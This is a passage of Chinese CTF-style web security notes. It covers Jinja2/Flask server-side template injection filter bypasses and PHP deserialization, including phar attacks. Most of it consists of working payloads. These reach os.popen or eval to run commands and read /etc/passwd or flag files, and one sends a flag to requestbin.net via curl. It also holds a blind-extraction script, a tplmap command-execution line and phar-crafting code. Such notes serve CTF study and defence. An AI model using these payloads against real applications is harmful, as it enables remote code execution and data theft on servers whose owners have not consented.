`request.args` 是flask中的一个属性，为返回请求的参数，这里把`path`当作变量名,将后面的路径传值进来，进而绕过了引号的过滤。

```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

unicode字符：`＂＂`，`＇＇`

#### **单下划线 _**

过滤了`_`可以用`dir(0)[0][0]`或者`request['args']`或者 `request['values']`绕过。

#### **双下划线 __**

**同样利用`request.args`属性。**

```
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}?&class=__class__&mro=__mro__&subclasses=__subclasses__
```

或者`request.values`属性。

```
{{()|attr(request.values.x)|attr(request.values.y)|attr(request.values.a)()|attr(request.values.z)(185)|attr(request.values.b)|attr(request.values.c)|attr(request.values.z)(request.values.d)|attr(request.values.z)(request.values.e)(request.values.f)|attr(request.values.g)|attr(request.values.z)(request.values.h)(request.values.i)}}&x=__class__&y=__base__&z=__getitem__&a=__subclasses__&b=__init__&c=__globals__&d=__builtins__&e=__import__&f=os&g=__dict__&h=system&i=curl http://requestbin.net/r/1eqk6r61?p=`cat /flag`
```

#### **点 .**

`''.__class__`可以写成 `getattr('','__class__')`或者 `''|attr('__class__')`。

`''.eval`可以写成 `''|attr('__getitem__')('eval')`。

`''.__class__`可以写成`''['__class__']`

#### **双花括号**

`{%if [expression]==[value]%} yes {%endif%}`

`{%print()%}`

unicode字符：`︷︷︸︸`

#### **圆括号**

unicode字符：`⁽⁾`，`₍₎`

对函数执行方式重载，如 `request.__class__.__getitem__=__builtins__.exec;`，执行`request[payload]` 时相当于 `exec(payload)`。

lambda表达式。

#### **外部参数利用**（爆破下标）

`request.args`或`request.values`。

#### **列目录**

复制

```
{{{}|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)|attr(request.args.init)|attr(request.args.g)|attr(request.args.item)(request.args.mod)|attr(request.args.func)(request.args.cmd)|attr(request.args.re)()}}&param=__class__&mro=__base__&sub=__subclasses__&item=__getitem__&init=__init__&g=__globals__&mod=os&func=popen&cmd=ls&re=read
```

#### **读文件**

复制

```
{{{}|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()}}
  &param=__class__&mro=__base__&sub=__subclasses__&item=__getitem__&file=/etc/passwd&re=read
```

#### **数字**

unicode字符：`𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗`，`𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡`，`０１２３４５６７８９`

#### **对象层面**

- set {}=None

  其他引用：

  `{{% set config=None %}} => {{url_for.__globals__.current_app.config}}`

  `{{% set __builtins__=None %}} => {{[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__}}`

- del

  重载： `reload(__builtins__)`

- 其他

  获得对应函数的上下文常量：`func.__code__.co_consts`

#### **关键字**

- **base64编码**

  `__getattribute__`使用实例访问属性时，调用该方法。

  例如被过滤掉`__class__`关键词：

  复制

  ```
  {{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
  ```

- **字符串拼接**

  复制

  ```
  yyy.__init__.__globals__.__builtins__|attr('__getit''em__')('ev''al')('__imp''ort__("o''s").po''pen("ls /").re''ad()')
  [].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()
  [].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["op"+"en"]("/fl"+"ag").read()
  ```

- **反转**

  复制

  ```
  {{cycler['__tini__'[::-1]]['__slabolg__'[::-1]].os.popen('id').read()}}
  ```

- **lower()**

  复制

  ```
  {{sss.__init__.__globals__.__builtins__.open("/FLAG".lower()).read()}}
  ```

- **清空关键字list**

  复制

  ```
  [关键字list变量名].clear()
  open("/flag").read()
  ```

- **16进制**

  复制

  ```
  .__class__ => ["\x5f\x5fc\x6cass\x5f\x5f"]
  ```

- **8进制**

  复制

  ```
  .__class__ => ["\137\137\143\154\141\163\163\137\137"]
  .__base__ => ["\137\137\142\141\163\145\137\137"]
  .__subclasses__ => ["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]
  .__init__ => ["\137\137\151\156\151\164\137\137"]
  .__globals__ => ["\137\137\147\154\157\142\141\154\163\137\137"]
  .__builtins__ => ["\137\137\142\165\151\154\164\151\156\163\137\137"]
  .__import__ => ["\137\137\151\155\160\157\162\164\137\137"]
  .popen => ["\160\157\160\145\156"]
  .read => ["\162\145\141\144"]
  ```

- **unicode编码**

  复制

  ```
  .__class__ => ["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]
  ```

- **unicode字符 / Non-ASCII Identifies**

  `𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳`

  `𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫`

  `０１２３４５６７８９`

  参考：https://www.compart.com/en/unicode/U+0030

- **attr与过滤器**

  如果没有过滤`globals`，从`globals`里把`eval`函数找出来，然后构造任意字符串放进去RCE即可。

  参考：https://www.gem-love.com/ctf/2598.html

  复制

  ```
  {% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}  # _
  {% set spa = ((app.__doc__|list()).pop(102)|string())%}  #空格
  {% set pt = ((app.__doc__|list()).pop(320)|string())%}  #点
  {% set yin = ((app.__doc__|list()).pop(337)|string())%}   #单引号
  {% set left = ((app.__doc__|list()).pop(264)|string())%}   #左括号(
  {% set right = ((app.__doc__|list()).pop(286)|string())%}   #右括号)
  {% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%}   #斜线/
  {% set bu = dict(buil=aa,tins=dd)|join() %}  #builtins
  {% set im = dict(imp=aa,ort=dd)|join() %}  #import
  {% set sy = dict(po=aa,pen=dd)|join() %}  #popen
  {% set os = dict(o=aa,s=dd)|join() %}  #os
  {% set ca = dict(ca=aa,t=dd)|join() %}  #cat
  {% set flg = dict(fl=aa,ag=dd)|join() %}  #flag
  {% set ev = dict(ev=aa,al=dd)|join() %} #eval
  {% set red = dict(re=aa,ad=dd)|join()%}  #read
  {% set bul = xhx*2~bu~xhx*2 %}  #__builtins__
  
  #拼接起来 __import__('os').popen('cat /flag').read()
  {% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} 
  
  
  {% for f,v in y1ng.__init__.__globals__.items() %} #globals
  	{% if f == bul %} 
  		{% for a,b in v.items() %}  #builtins
  			{% if a == ev %} #eval
  				{{b(pld)}} #eval(pld)
  			{% endif %}
  		{% endfor %}
  	{% endif %}
  {% endfor %}
  
  #payload
  #{%%20set%20xhx%20=%20(({%20}|select()|string()|list()).pop(24)|string())%}{%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%}{%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%}%20{%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%}{%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%}%20{%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%}%20{%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%}%20{%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%}{%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%}{%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%}{%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%}%20{%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%}{%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%}{%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%}%20{%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%}{%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%}{%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%}%20{%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%}{%%20if%20f%20==%20bul%20%}{%%20for%20a,b%20in%20v.items()%20%}{%%20if%20a%20==%20ev%20%}{{b(pld)}}{%%20endif%20%}{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}
  ```

  复制

  ```
  {%set a=dict(po=x,p=x)|join%}  #pop
  {%set b=(()|select|string|list)|attr(a)(𝟐𝟒)%}  #_
  {%set c=(b,b,dict(do=x,c=x)|join,b,b)|join()%}  #__doc__
  {%set d=(x|attr(c)|list)|attr(a)(𝟑𝟑𝟕)%}  #单引号
  {%set e=(x|attr(c)|list)|attr(a)(𝟐𝟔𝟒)%}  #左括号(
  {%set f=(x|attr(c)|list)|attr(a)(𝟐𝟖𝟔)%}  #右括号)
  {%set g=(x|attr(c)|list)|attr(a)(𝟑𝟐𝟎)%}  #点.
  {%set h=(x|attr(c)|list)|attr(a)(𝟏𝟎𝟐)%}  #空格
  {%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%}  #__init__
  {%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%}  #__globals__
  {%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%}  #__getitem__
  {%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%}  #__builtins__
  {%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%}  #__import__
  {%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(𝟑𝟒𝟗)%}
  {%set o=dict(ev=x,al=x)|join()%}  #eval
  {%set p=dict(o=x,s=x)|join()%}  #os
  {%set q=dict(po=x,pen=x)|join()%}  #popen
  {%set r=dict(re=x,ad=x)|join()%}  #read
  {%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%}
  {%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%}
  {%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%}
  {{u}}
  ```

  复制

  ```
  {% set id=dict(ind=a,ex=a)|join%}
  {% set pp=dict(po=a,p=a)|join%}
  {% set ls=dict(ls=a)|join%}
  {% set ppe=dict(po=a,pen=a)|join%}
  {% set gt=dict(ge=a,t=a)|join%}
  {% set cr=dict(ch=a,r=a)|join%}
  {% set nn=dict(n=a)|join%}
  {% set tt=dict(t=a)|join%}
  {% set ff=dict(f=a)|join%}
  {% set ooqq=dict(o=a,s=a)|join %}
  {% set rd=dict(re=a,ad=a)|join%}
  {% set five=(lipsum|string|list)|attr(id)(tt) %}
  {% set three=(lipsum|string|list)|attr(id)(nn) %}
  {% set one=(lipsum|string|list)|attr(id)(ff) %}
  {% set shiba=five*five-three-three-one %}
  {% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}
  {% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}
  {% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}
  {% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}
  {% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}
  {% set space=chcr(three*three*five-five-five-three) %}
  {% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}
  {{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}
  ```

- **无回显**

  复制

  ```
  {{yyy.__init__.__globals__.__builtins__|attr('__getitem_')('eval')('__import__("time").sleep(3) if open("/app/flag.txt").read()[0]=="f" else 1')}}
  
  {%if session.update({'f':lipsum.__globals__.__os__.__popen__('id').read()})%}{%endif%}
  
  {%include session.update({'f':lipsum.__globals__.__os__.__popen__('id').read()})%}
  ```

  盲注：

  复制

  ```
  import requests
  from string import printable as pt
  
  host = ''
  res  = ''
  
  for i in range(0,40):
      for c in pt:
          payload = '{{(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__["__builtins__"]["file"]("/etc/passwd").read()|string).index("%c",%d,%d)}}' % (c,i,i+1) 
          param = {
              "name":payload
          }
          req = requests.get(host,params=param)
  
          if req.status_code == 200:
              res += c
              break
      print(res)
  ```



#### 自动化工具

**tplmap**: https://github.com/epinna/tplmap

```
/tplmap.py --os-cmd -u 'http://www.target.com/page?name=John'
```

#### 参考文

[SSTI模板注入绕过（进阶篇）](https://blog.csdn.net/miuzzx/article/details/110220425)

[SSTI漏洞学习 (上)——基础知识和一些不常见的模板引擎介绍](https://www.anquanke.com/post/id/246093)



#### Python格式化字符串漏洞

[Python 格式化字符串漏洞（Django为例）](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)



#### Payload参考

[Server Side Template Injection](https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34)

[SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)











## [4.反序列化](https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

反序列化

### 反序列化中常见的魔术方法

> 1. __construct()  #每次创建新对象时先调用此方法
>    __destruct()  #某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发，如 a:2:{i:0;O:4:"User":0:{}i:0;s:3:"xxx";}，被覆盖后没有变量指向User对象）
>    __toString()  #把类被当做一个字符串使用时调用
>    __wakeup()  #使用unserialize函数，反序列化恢复对象之前时调用
>    __sleep()  #使用serialize()函数，序列化对象之前时调用
>    __call()  #在对象中，调用不存在的方法或调用权限不足时调用
>    __callstatic()    #在静态上下文中，调用不可访问的方法时触发
>    __get()  #访问不存在的成员变量时调用
>    __set()   #设置不存在的成员变量时调用
>    __invoke()  #当尝试以调用函数的方式调用一个对象时触发
>    __autoload()  #尝试加载未定义的类
>    __isset()   #在不可访问的属性上调用isset()或empty()触发
>    __unset()   #在不可访问的属性上使用unset()时触发

### __wakeup绕过

原理：
当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行
示例：
`O:4:"Dino":***\*1\****:{s:1:"a";s:4:"misc";}`改为`O:4:"Dino":***\*2\****:{s:1:"a";s:4:"misc";}`

### protected和private绕过

> 如果变量前是protected，则是\x00*\x00类名的形式
> 如果变量前是private，则是\x00类名\x00的形式

> 绕过：
> ①：php7.1+反序列化对类属性不敏感，将protected改成public
> ②：手动将序列化后的形式改为protected或者private的标准形式，结合urlencode和base64编码进行操作

例子形式：

```php
<?php
class test{
    public $a ="r";
    private $b = "r";
    protected $c = "r";

}
$flag = new test();
echo serialize($flag);
?>
```

输出

```
O:4:"test":3:{s:1:"a";s:1:"r";s:7:"testb";s:1:"r";s:4:"*c";s:1:"r";}
```

在编译器vs中输出内容显示是没有\x00（空格）；可能是被显示忽略了，但它是存在空格的，正确如下：testb是private变量，序列化格式为‘ test b'共7个字符；

```
O:4:"test":3:{s:1:"a";s:1:"r";s:7:" test b";s:1:"r";s:4:" * c";s:1:"r";}
```



概念：序列化就是使用**serialize()**将对象的用字符串的方式进行表示，反序列化是使用**unserialize()**将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。 序列化的对象可以是**class**也可以是**Array,string**等其他对象。

问题原因：漏洞的根源在于**unserialize()**函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。



### 序列化格式

对象类型:对象名长度:”对象名”:对象成员变量个数:{变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:”变量名2”; 参数2类型:参数2长度:参数2;… …}

如：

O:6:”Person”:2:{s:12:” Person name”;s:8:”Thinking”;s:11:” Person sex”;s:3:”man”;} a:2:{s:4:”name”;s:8:”Thinking”;s:3:”sex”;s:3:”man”;}

**对象类型：**Class-O，Array-a。

**变量和参数类型：**string-s，int-i，Array-a，引用-R。

**序列符号：**参数与变量之间用分号(;)隔开，同一变量和同一参数之间的数据用冒号(:)隔开。

|   类型    |                             结构                             |
| :-------: | :----------------------------------------------------------: |
|  String   |                        s:size:value;                         |
|  Integer  |                           i:value;                           |
|  Boolean  |                      b:value;(保存1或0)                      |
|   Null    |                              N;                              |
|   Array   | a:size:{key definition;value definition;(repeated per element)} |
|  Object   | O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} |
| Reference |                             R:2;                             |



### 三种访问控制的区别

public: **变量名**

protected: **\x00 + \* + \x00 + 变量名**（或 **\00 + \* + \00 + 变量名** 或 **%00 + \* + %00 + 变量名**）

private: **\x00 + 类名 + \x00 + 变量名**（或 **\00 + 类名 + \00 + 变量名** 或 **%00 + 类名 + %00 + 变量名**）

注：>=php v7.2 反序列化对访问类别不敏感（protected -> public）



### 魔术方法

复制

```
__construct()  #每次创建新对象时先调用此方法
__destruct()  #某个对象的所有引用都被删除或者销毁时调用（没有变量指到当前对象时也会被触发，如 a:2:{i:0;O:4:"User":0:{}i:0;s:3:"xxx";}，被覆盖后没有变量指向User对象）
__toString()  #把类被当做一个字符串使用时调用
__wakeup()  #使用unserialize函数，反序列化恢复对象之前时调用
__sleep()  #使用serialize()函数，序列化对象之前时调用
__call()  #在对象中，调用不存在的方法或调用权限不足时调用
__callstatic()    #在静态上下文中，调用不可访问的方法时触发
__get()  #访问不存在的成员变量时调用
__set()   #设置不存在的成员变量时调用
__invoke()  #当尝试以调用函数的方式调用一个对象时触发
__autoload()  #尝试加载未定义的类
__isset()   #在不可访问的属性上调用isset()或empty()触发
__unset()   #在不可访问的属性上使用unset()时触发
```



### 绕过方法

- ##### __wakeup()失效

  1. PHP5<5.6.25 或 PHP7<7.0.10

     当序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行。

     如：`O:4:"Demo":2:{s:10:"Demofile";s:16:"f15g_1s_here.php";}`

  2. `Serialize` 特性：`O` 改为 `C`

     [bypass __wakeup](https://bugs.php.net/bug.php?id=81151)

- ##### 绕过preg_match()

  可使用`+`，`<`绕过正则，如：

  `O:+4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}`

  `O:<4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}`

- ##### 绕过关键字

  PHP序列化中存在序列化类型 `S`，相较于小写的 `s`，大写 `S` 是escaped字符串，会将 `\xx` 形式作为一个16进制字符处理，如：

  `n` 的十六进制是 `6e`，所以把 `name`替换为 `\6eame` 即可绕过。

- ##### 绕过 throw new Exception

  - 去掉最后的大括号，利用反序列化报错来防止进入 Exception

  - GC

    `a:2:{i:0;O:7:"getflag":{}i:0;N;}`

    因为**反序列化的过程是顺序执行**的，所以到第一个属性时，会将`Array[0]`设置为`getflag`对象，同时我们又将`Array[0]`设置为`null`，这样前面的`getflag`对象便丢失了引用，就会被GC所捕获，便可以执行`__destruct`。

- ##### 绕过 md5+sha1 验证

  判断条件：

  复制

  ```
  if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1) === sha1($this->var2)) ) {
      eval($this->var1);
  }
  ```

  传入2个不相等对象，但是他们的 `__toString` 魔法函数返回的一样，可以绕过 if，且eval转为字符串时我们也使其可以被执行。

  查找带 `__toString` 的类，满足的有 `Exception/ErrorException/Error/ParseError/mysqli_sql_exception` 等，以 `Exception` 为例，construct函数为：

  `public function __construct($message = "", $code = 0, Throwable $previous = null)`

  它返回的是一个字符串类型的异常信息，可以控制传入 `message` 和 `code` 的值不同即可。

  复制

  ```
  $cmd ='system("cat /flag");?>';
  $ex1 = new Exception($cmd);
  $ex2 = new Exception($cmd,1);
  ```

- ##### unserialize_callback_func + spl_autoload

  在 [php manual](https://www.php.net/manual/zh/var.configuration.php#ini.unserialize-callback-func) 里面有一个很有趣的变量配置，如果在反序列化的时候需要实例化一个未定义的类，可以设置回调函数以供调用，最关键的是这个配置是 PHP_IN_ALL 的，所以可以直接通过 ini_set 来设置。

  > **注意**: **unserialize_callback_func 指令**
  >
  > 如果在反序列化的时候需要实例化一个未定义类，则可以设置回调函数以供调用（以免得到的是不完整的 object “__PHP_Incomplete_Class”）。可通过 php.ini、[ini_set()](https://www.php.net/manual/zh/function.ini-set.php) 或 .htaccess 定义‘unserialize_callback_func’。每次实例化一个未定义类时它都会被调用。若要禁止这个特性，只需置空此设定。

  可以通过 **spl_autoload** 来自动加载未定义的类 settings，会默认加载当前目录下，以settings类名为文件名，php 或者 inc 为后缀的文件，这样就和 settings.inc 联系到了一起。

  > **spl_autoload** — __autoload()函数的默认实现
  >
  > spl_autoload ( string `$class_name` , string `$file_extensions` = ? ) : void
  >
  > file_extensions: 在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc 或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。

**引用绕过**

![image-20230210224630804](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20230210224630804.png)

使用引用，可实现$o->secret 永远等于enter；便可绕过$o->secret  === $o->enter

![image-20230210224546214](C:\Users\Treaveler\AppData\Roaming\Typora\typora-user-images\image-20230210224546214.png)



### 反序列化字符逃逸

PHP 在反序列化时，底层代码是以 `;` 作为字段的分隔，以 `}` 作为结尾(字符串除外)，并且是根据长度判断内容的。

**1.字符增多**

例子：

复制

```php
<?php
function filter($string){
    return str_replace('x','yy',$string);
}

$username = "peri0d";
$password = "aaaaa";
$user = array($username, $password);

var_dump(serialize($user));
echo '\n';

$r = filter(serialize($user));

var_dump($r);
echo '\n';

var_dump(unserialize($r));
```

1. 正常情况下的序列化结果为 `a:2:{i:0;s:6:"peri0d";i:1;s:5:"aaaaa";}`。

2. 那如果把 `username` 换成 `peri0dxxx` ，其处理后的序列化结果为

   `a:2:{i:0;s:9:"peri0dyyyyyy";i:1;s:5:"aaaaa";}` ，

   这个时候肯定会反序列化失败，可以看到 `s:9:"peri0dyyyyyy"` 比以前多了 3 个字符。

3. 回到前面， `a:2:{i:0;s:6:"peri0d";i:1;s:5:"aaaaa";}`

   它在进行修改密码之后就变为

   `a:2:{i:0;s:6:"peri0d";i:1;s:6:"123456";}i:1;s:5:"aaaaa";}`。

4. 可以看到需要添加的字符串 `";i:1;s:6:"123456";}` 长度为 `20`。

5. 假设要在 `peri0d` 后面填充 `4` 个字符，那么就是

   `s:30:'peri0dxxxx";i:1;s:6:"123456";}';`

   在经过处理之后就是

   `s:30:'peri0dyyyyyyyy";i:1;s:6:"123456";}';`

   读取 `30` 个字符为 `peri0dyyyyyyyy";i:1;s:6:"12345`。

6. 这就需要继续增加填充字符，在有 `20` 个 `x` 时，就实现了密码的修改。

   6+x+20=6+2x⇒x=206+x+20=6+2x⇒x=20

   ![20191112223227-402c9c0c-0559-1](https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20191112223227-402c9c0c-0559-1.png)

7. 可以看到，这和 `username` 前面的 `peri0d` 是**毫无关系**的，**只和做替换的字符串有关**。

   **2.字符减少**

   



### phar反序列化

phar文件本质上是一种压缩文件，在使用phar协议文件包含时，也是可以直接读取zip文件的。使用phar://协议读取文件时，文件会被解析成phar对象，phar对象内的以序列化形式存储的用户自定义元数据（metadata）信息会被反序列化。这就引出了我们攻击手法最核心的流程。

流程：构造phar（元数据中含有恶意序列化内容）文件—>上传—>触发反序列化

最后一步是寻找触发phar文件元数据反序列化。其实php中有一大部分的文件系统函数在通过phar://伪协议解析phar文件时都会将meta-data进行反序列化。

**利用条件**

- phar文件要能够上传到服务器端。能触发的文件操作函数：

  include、file_get_contents、file_put_contents、copy、file、file_exists、is_executable、is_file、is_dir、is_link、is_writable、fileperms、fileinode、filesize、fileowner、filegroup、fileatime、filemtime、filectime、filetype、getimagesize、exif_read_data、stat、lstat、touch、md5_file

- 要有可用的魔术方法作为“跳板”。

- 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤。

**生成phar文件**

首先得生成一个含有序列化metadata的phar文件。php提供一个类允许我们处理phar文件相关操作。注意要设置php.ini中**phar.readonly=Off**。

复制

```
<?php
class User {
    Public $name；
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar，生成后可以随意修改
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$o = new User();   
$o->name = 'JrXnm';
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

tar包装：

复制

```
<?php
class User {
    Public $name；
}

$o = new User();   
$o->name = 'JrXnm';
@unlink("phar.tar");
@system('rm -r .phar');
@system('mkdir .phar');
file_put_contents('.phar/.metadata',serialize($o));
system('tar -cf phar.tar .phar/*');

// phar://./phar.tar
// phar:///var/www/html/uploads/phar.tar
```

zip包装：

复制

```
<?php
class User {
    Public $name；
}

$o = new User();   
$o->name = 'JrXnm';
$d = serialize($o);
if(file_exists('phar.zip')) {
    @unlink("phar.zip");
}
$zip = new ZipArchive;
$res = $zip->open('phar.zip', ZipArchive::CREATE);
$zip->addFromString('test.txt', 'file content goes here');
$zip->setArchiveComment($d);
$zip->close();

// phar://./phar.zip
// phar:///var/www/html/uploads/phar.zip
```

**上传到服务器**

phar文件是很容易绕过上传限制的，首先它的后缀是不限制的，改成什么phar://协议都可以解析。

前面这个标志的格式为`xxx<?php xxx; __HALT_COMPILER();?>` 前面内容不限，这样可以在前面添加注入`GIF98a`这样的文件头绕过上传限制。

**反序列化执行**

直接执行测试的那份代码，phar://协议在file_get_contents函数中解析phar文件，将元数据反序列化执行魔法函数。

**绕过**

- **phar://不能出现在首部**

  复制

  ```
  compress.zlib://phar://
  compress.bzip2://phar://
  php://filter/resource=phar://
  ```

- **关键字**

  绕过如 `HALT_COMPILER`，使用 `gzip` 命令处理phar文件：

  `gzip phar.jpg`

  参考：[从一道题再看phar的利用](https://www.anquanke.com/post/id/240007#h2-5)

- **修改phar文件**

  改phar文件内容，因phar文件是有检验和的，所以直接改phar文件内容不可行。

  参考：[总结 - ctf中php的phar(一)](https://morblog.cc/posts/2586386993/)

  修复签名数据：

  复制

  ```
  from hashlib import sha1
  f = open('./ph1.phar', 'rb').read() # 修改内容后的phar文件
  s = f[:-28] # 获取要签名的数据
  h = f[-8:] # 获取签名类型以及GBMB标识
  newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
  open('ph2.phar', 'wb').write(newf) # 写入新文件
  ```

  构造phar结构：

  复制

  ```
  from zlib import crc32
  from struct import pack
  from time import time
  from hashlib import md5, sha1, sha256, sha512
  
  
  class PHAR:
      # 一些常量
      STUB = b"__HALT_COMPILER(); ?>"
      GBMB = b"GBMB"
      MD5 = b"\x01\x00\x00\x00"
      SHA1 = b"\x02\x00\x00\x00"
      SHA256 = b"\x03\x00\x00\x00"
      SHA512 = b"\x04\x00\x00\x00"
  
      def __init__(self,
                   prefix: str,
                   manifestData: dict,
                   filesData: list,
                   signatureType: MD5
                   ):
          self.prefix = prefix.encode()
          self.manifestData = manifestData
          self.filesData = filesData
          self.signatureType = signatureType
  
      def parse(self):
  
          # 检查清单的参数
          if any(self.manifestData.get(each) is None for each in ["loc", "metaData"]):
              return False
          # 至少要归档一个文件
          if len(self.filesData) == 0:
              return False
          # 遍历检查文件的参数
          for file in self.filesData:
              if any(file.get(each) is None for each in ["fileName", "fileContent", "loc", "metaData"]):
                  return False
  
          # 将字符串转换字节流
          self.manifestData["metaData"] = self.manifestData["metaData"].encode()
          for file in self.filesData:
              for key, value in file.items():
                  if key in ["fileName", "fileContent", "metaData"]:
                      file[key] = value.encode()
  
          return True
  
      def generate(self):
  
          # 检查参数
          if not self.parse():
              return b""
  
          phar = b""
          # stub
          stub = self.stub()
          # manifest
          manifest = self.manifest()
          files = self.file()
          # content
          contents = self.content()
          # 计算总长度
          manifest = pack("I", len(manifest + files + contents)) + manifest[4:]
          # signature
          signature = self.signature(stub + manifest + files + contents)
          # 重新拼接
          phar += stub + manifest + files + contents + signature
  
          return phar
  
      def stub(self):
          return self.prefix + self.STUB + b"\r\n"
  
      def manifest(self):
  
          # 归档文件数量
          manifest = pack("I", len(self.filesData))
          # 版本
          manifest += b"\x11\x00"
          # 标识
          manifest += b"\x00\x00\x01\x00"
          # 别名长度
          manifest += b"\x00\x00\x00\x00"
  
          # 如果将序列化内容存储于此
          if self.manifestData["loc"]:
              # metadata长度
              manifest += pack("I", len(self.manifestData["metaData"]))
              # metadata内容
              manifest += self.manifestData["metaData"]
          else:
              manifest += pack("I", 0)
  
          # 补足长度
          manifest = pack("I", 0) + manifest
  
          return manifest
  
      def file(self):
  
          files = b""
  
          # 遍历归档的文件
          for file in self.filesData:
              # 文件名长度
              files += pack("I", len(file["fileName"]))
              # 文件名
              files += file["fileName"]
              # 未压缩大小
              files += pack("I", len(file["fileContent"]))
              # 时间戳
              files += pack("I", int(time()))
              # 压缩后大小
              files += pack("I", len(file["fileContent"]))
              # CRC32校验
              files += pack("I", crc32(file["fileContent"]))
              # 文件权限
              files += pack("I", 0o666)
  
